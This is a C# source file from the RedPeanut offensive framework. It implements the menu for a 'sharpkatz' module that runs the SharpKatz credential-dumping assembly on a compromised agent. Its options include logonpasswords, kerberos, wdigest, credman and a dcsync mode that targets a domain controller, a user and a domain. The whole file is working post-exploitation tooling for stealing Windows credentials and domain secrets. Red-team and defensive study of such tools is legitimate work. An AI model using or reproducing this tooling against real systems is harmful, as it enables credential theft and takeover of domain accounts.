//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Linq;
using static RedPeanut.Utility;

namespace RedPeanut
{
    class SharpkatzManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set command", "Command to execute (logonpasswords,msv,kerberos,credman,tspkg,wdigest)" },
            { "set user", "Target user for dcsync" },
            { "set guid", "Target guid for dcsync" },
            { "set domain", "Domain context for dcsync" },
            { "set domaincontroller", "Domaincontroller for dcsync" },
            { "set altservice", "Alternative service to use for dcsync (default ldap)" },
            { "options", "Print help" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" },
            { "run", "Run command" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "sharpkatz";
        string command;
        string username;
        string guid;
        string domain;
        string domaincontroller;
        string altservice;

        public SharpkatzManager()
        {

        }

        public SharpkatzManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                SharpkatzMenu(input);
            } while (input != "back");
        }

        private void SharpkatzMenu(string input)
        {
            string[] a_input = input.Split(' ');
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set command":
                            command = GetParsedSetString(input);
                            break;
                        case "set user":
                            username = GetParsedSetString(input);
                            break;
                        case "set guid":
                            guid = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "set domaincontroller":
                            domaincontroller = GetParsedSetString(input);
                            break;
                        case "set altservice":
                            altservice = GetParsedSetString(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }
        
        private void Run()
        {
            List<string> args = new List<string>();

            if (!string.IsNullOrEmpty(command))
            {
                if(!command.Equals("logonpasswords") && !command.Equals("msv") && !command.Equals("kerberos") && !command.Equals("credman") && !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync"))
                {
                    Console.WriteLine("Unknown command");
                    return;
                }

                args.Add("--Command");
                args.Add(command);

                if (command.Equals("dcsync"))
                {
                   
                    if (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(guid) || !string.IsNullOrEmpty(domain))
                    {
                        if (!string.IsNullOrEmpty(guid))
                        {
                            args.Add("--Guid");
                            args.Add(guid);
                        }
                        else if (!string.IsNullOrEmpty(username))
                        {
                            args.Add("--User");
                            args.Add(username);
                        }

                        if (!string.IsNullOrEmpty(domain))
                        {
                            args.Add("--Domain");
                            args.Add(domain);
                        }
                        if (!string.IsNullOrEmpty(domaincontroller))
                        {
                            args.Add("--DomainController");
                            args.Add(domaincontroller);
                        }
                        if (!string.IsNullOrEmpty(altservice))
                        {
                            args.Add("--Altservice");
                            args.Add(altservice);
                        }
                    }
                    else
                    {
                        Console.WriteLine("You must specify at least one of the following parameters: user, guid, domain");
                    }

                }

                RunAssembly(PL_MODULE_SHARPKATZ, "SharpKatz.Program", args.ToArray<string>(), agent);
            }
            else
            {
                Console.WriteLine("You must specify command parameter");
            }


        }

        private void PrintCurrentConfig()
        {
            Console.WriteLine("{0}", modulename);
            Console.WriteLine();

            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "command", command },
                { "user", username },
                { "guid", guid },
                { "domain", domain },
                { "domaincontroller", domaincontroller },
                { "altservice", altservice },
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}

